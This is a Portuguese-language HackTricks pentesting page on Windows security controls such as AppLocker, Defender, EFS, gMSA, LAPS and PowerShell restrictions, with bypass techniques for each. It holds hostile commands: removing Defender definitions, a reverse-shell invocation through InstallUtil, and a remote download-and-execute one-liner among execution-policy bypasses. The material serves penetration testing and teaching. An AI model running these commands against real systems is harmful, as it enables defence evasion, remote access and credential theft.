## Controles de Segurança do Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com facilidade, usando as **ferramentas da comunidade mais avançadas do mundo**.\
Obtenha acesso hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Política do AppLocker

Uma lista branca de aplicativos é uma lista de aplicativos ou executáveis aprovados que podem estar presentes e ser executados em um sistema. O objetivo é proteger o ambiente de malware prejudicial e software não aprovado que não esteja alinhado com as necessidades específicas de negócios de uma organização.&#x20;

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) é a solução de **lista branca de aplicativos** da Microsoft e dá aos administradores do sistema controle sobre **quais aplicativos e arquivos os usuários podem executar**. Ele fornece **controle granular** sobre executáveis, scripts, arquivos de instalação do Windows, DLLs, aplicativos empacotados e instaladores de aplicativos empacotados. \
É comum que as organizações **bloqueiem cmd.exe e PowerShell.exe** e o acesso de gravação a determinados diretórios, **mas tudo isso pode ser contornado**.

### Verificação

Verifique quais arquivos/extensões estão na lista negra/lista branca:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
As regras do AppLocker aplicadas a um host também podem ser **lidas do registro local** em **`HKLM\Software\Policies\Microsoft\Windows\SrpV2`**.

### Bypass

* Pastas **graváveis** úteis para burlar a Política do AppLocker: Se o AppLocker permitir a execução de qualquer coisa dentro de `C:\Windows\System32` ou `C:\Windows`, existem **pastas graváveis** que você pode usar para **burlar isso**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Binários comumente **confiáveis** do [**"LOLBAS"**](https://lolbas-project.github.io/) também podem ser úteis para contornar o AppLocker.
* **Regras mal escritas também podem ser contornadas**
  * Por exemplo, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, você pode criar uma **pasta chamada `allowed`** em qualquer lugar e ela será permitida.
  * As organizações também costumam se concentrar em **bloquear o executável `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mas esquecem dos **outros** [**locais de executáveis do PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
* A aplicação de **DLLs muito raramente é habilitada** devido à carga adicional que pode ser colocada em um sistema e à quantidade de testes necessários para garantir que nada quebre. Portanto, usar **DLLs como backdoors ajudará a contornar o AppLocker**.
* Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e contornar o AppLocker. Para mais informações, verifique: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Armazenamento de Credenciais

### Gerenciador de Contas de Segurança (SAM)

As credenciais locais estão presentes neste arquivo, as senhas estão hashadas.

### Autoridade de Segurança Local (LSA) - LSASS

As **credenciais** (hashadas) são **salvas** na **memória** deste subsistema por motivos de Single Sign-On.\
**LSA** administra a **política de segurança** local (política de senha, permissões de usuários...), **autenticação**, **tokens de acesso**...\
LSA será o responsável por **verificar** as credenciais fornecidas dentro do arquivo **SAM** (para um login local) e **conversar** com o **controlador de domínio** para autenticar um usuário do domínio.

As **credenciais** são **salvas** dentro do processo LSASS: tickets Kerberos, hashes NT e LM, senhas facilmente descriptografadas.

### Segredos do LSA

O LSA pode salvar em disco algumas credenciais:

* Senha da conta do computador do Active Directory (controlador de domínio inacessível).
* Senhas das contas de serviços do Windows
* Senhas para tarefas agendadas
* Mais (senha de aplicativos IIS...)

### NTDS.dit

É o banco de dados do Active Directory. Está presente apenas em Controladores de Domínio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) é um Antivírus que está disponível no Windows 10 e no Windows 11, e em versões do Windows Server. Ele **bloqueia** ferramentas comuns de pentesting como **`WinPEAS`**. No entanto, existem maneiras de **contornar essas proteções**.&#x20;

### Verificação

Para verificar o **status** do **Defender**, você pode executar o cmdlet do PS **`Get-MpComputerStatus`** (verifique o valor de **`RealTimeProtectionEnabled`** para saber se está ativo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :</code></pre>

Para enumerá-lo, você também pode executar:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## EFS (Sistema de Arquivos Criptografados)

O EFS funciona criptografando um arquivo com uma **chave simétrica** em massa, também conhecida como Chave de Criptografia de Arquivo ou **FEK**. O FEK é então **criptografado** com uma **chave pública** associada ao usuário que criptografou o arquivo, e este FEK criptografado é armazenado no $EFS **fluxo de dados alternativo** do arquivo criptografado. Para descriptografar o arquivo, o driver do componente EFS usa a **chave privada** que corresponde ao certificado digital EFS (usado para criptografar o arquivo) para descriptografar a chave simétrica armazenada no fluxo $EFS. De [aqui](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

Exemplos de arquivos sendo descriptografados sem que o usuário solicite:

* Arquivos e pastas são descriptografados antes de serem copiados para um volume formatado com outro sistema de arquivos, como [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table).
* Arquivos criptografados são copiados pela rede usando o protocolo SMB/CIFS, os arquivos são descriptografados antes de serem enviados pela rede.

Os arquivos criptografados usando este método podem ser **acessados de forma transparente pelo usuário proprietário** (aquele que os criptografou), portanto, se você puder **se tornar esse usuário**, poderá descriptografar os arquivos (alterar a senha do usuário e fazer login como ele não funcionará).

### Verificar informações do EFS

Verifique se um **usuário** **usou** este **serviço** verificando se este caminho existe: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Verifique **quem** tem **acesso** ao arquivo usando cipher /c \<file>\
Você também pode usar `cipher /e` e `cipher /d` dentro de uma pasta para **criptografar** e **descriptografar** todos os arquivos.

### Descriptografando arquivos EFS

#### Sendo o Sistema de Autoridade

Este método requer que o **usuário vítima** esteja **executando** um **processo** dentro do host. Se esse for o caso, usando uma sessão `meterpreter`, você pode se passar pelo token do processo do usuário (`impersonate_token` de `incognito`). Ou você pode simplesmente `migrar` para o processo do usuário.

#### Conhecendo a senha do usuário

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Contas de Serviço Gerenciadas em Grupo (gMSA)

Na maioria das infraestruturas, as contas de serviço são contas de usuário típicas com a opção "**Senha nunca expira**". Manter essas contas pode ser uma bagunça real e é por isso que a Microsoft introduziu as **Contas de Serviço Gerenciadas:**

* Não há mais gerenciamento de senha. Ele usa uma senha complexa, aleatória e de 240 caracteres e a altera automaticamente quando atinge a data de expiração da senha do domínio ou do computador.
  * Usa o Microsoft Key Distribution Service (KDC) para criar e gerenciar as senhas para o gMSA.
* Não pode ser bloqueado ou usado para login interativo
* Suporta compartilhamento em vários hosts
* Pode ser usado para executar tarefas agendadas (as contas de serviço gerenciadas não suportam a execução de tarefas agendadas)
* Gerenciamento simplificado de SPN - O sistema mudará automaticamente o valor do SPN se os detalhes do **sAMaccount** do computador mudarem ou se a propriedade do nome DNS mudar.

As contas gMSA têm suas senhas armazenadas em uma propriedade LDAP chamada _**msDS-ManagedPassword**_, que é **automaticamente** redefinida pelos DCs a cada 30 dias, são **recuperáveis** por **administradores autorizados** e pelos **servidores** em que estão instalados. _**msDS-ManagedPassword**_ é um blob de dados criptografados chamado [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) e só pode ser recuperado quando a conexão é segura, **LDAPS** ou quando o tipo de autenticação é 'Sealing & Secure', por exemplo.

![Imagem de https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Portanto, se o gMSA estiver sendo usado, verifique se ele tem **privilégios especiais** e também verifique se você tem **permissões** para **ler** a senha dos serviços.

Você pode ler esta senha com [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
Além disso, verifique esta [página da web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre como realizar um ataque de relé NTLM para **ler** a **senha** do **gMSA**.

## LAPS

****[**Local Administrator Password Solution (LAPS)**](https://www.microsoft.com/en-us/download/details.aspx?id=46899) permite que você **gerencie a senha do administrador local** (que é **aleatória**, única e **alterada regularmente**) em computadores associados ao domínio. Essas senhas são armazenadas centralmente no Active Directory e restritas a usuários autorizados usando ACLs. Se o seu usuário tiver permissões suficientes, você poderá ler as senhas dos administradores locais.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## Modo de linguagem restrita do PS

O **** [**Modo de linguagem restrita do PowerShell**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **bloqueia muitos dos recursos** necessários para usar o PowerShell de forma eficaz, como bloquear objetos COM, permitir apenas tipos .NET aprovados, fluxos de trabalho baseados em XAML, classes do PowerShell e muito mais.

### **Verificação**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypassar
```powershell
#Easy bypass
Powershell -version 2
```
No Windows atual, o Bypass não funcionará, mas você pode usar o [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).

**Para compilá-lo, você pode precisar** **adicionar uma referência** -> _Procurar_ -> _Procurar_ -> adicione `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **alterar o projeto para .Net4.5**.

#### Bypass direto:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Shell reverso:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Você pode usar o [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e contornar o modo restrito. Para mais informações, consulte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Política de Execução do PS

Por padrão, ela é definida como **restrita**. As principais maneiras de contornar essa política são:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
## Interface de Provedor de Suporte de Segurança (SSPI)

É a API que pode ser usada para autenticar usuários.

O SSPI será responsável por encontrar o protocolo adequado para duas máquinas que desejam se comunicar. O método preferido para isso é o Kerberos. Em seguida, o SSPI negociará qual protocolo de autenticação será usado, esses protocolos de autenticação são chamados de Provedor de Suporte de Segurança (SSP), estão localizados dentro de cada máquina Windows na forma de um DLL e ambas as máquinas devem suportar o mesmo para poderem se comunicar.

### Principais SSPs

* **Kerberos**: O preferido
  * %windir%\Windows\System32\kerberos.dll
* **NTLMv1** e **NTLMv2**: Por razões de compatibilidade
  * %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Servidores web e LDAP, senha na forma de um hash MD5
  * %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL e TLS
  * %windir%\Windows\System32\Schannel.dll
* **Negotiate**: É usado para negociar o protocolo a ser usado (Kerberos ou NTLM, sendo o Kerberos o padrão)
  * %windir%\Windows\System32\lsasrv.dll

#### A negociação pode oferecer vários métodos ou apenas um.

## UAC - Controle de Conta de Usuário

[Controle de Conta de Usuário (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que permite um **prompt de consentimento para atividades elevadas**.&#x20;

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}



![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente com as **ferramentas da comunidade mais avançadas do mundo**.\
Obtenha acesso hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
